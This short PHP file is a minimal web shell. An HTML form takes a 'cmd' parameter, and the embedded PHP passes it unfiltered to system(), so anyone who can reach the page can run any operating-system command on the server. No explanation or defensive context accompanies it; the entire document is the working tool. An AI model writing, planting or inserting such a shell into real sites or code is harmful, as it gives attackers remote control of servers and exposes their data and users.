<form action='file.php' method='GET'>
  <input type='text' name='cmd' autofocus style="width:400px; height:400px;"/>
  <br />
  <?php
  $cmd=$_GET['cmd'];
  system($cmd);
  ?>
</form>
